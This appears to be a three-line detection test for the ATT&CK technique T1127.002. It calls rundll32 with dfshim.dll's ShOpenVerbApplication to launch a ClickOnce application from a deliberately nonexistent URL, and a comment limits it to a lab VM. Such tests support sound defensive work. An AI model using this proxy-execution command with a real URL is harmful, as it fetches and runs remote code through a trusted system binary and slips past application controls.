# Test for T1127.002 - call dfshim ShOpenVerbApplication with a URL that does not exist.
# Run in a lab/test VM only. ClickOnce shows an error dialog; close it.
rundll32.exe dfshim.dll,ShOpenVerbApplication https://example.invalid/T1127002.application
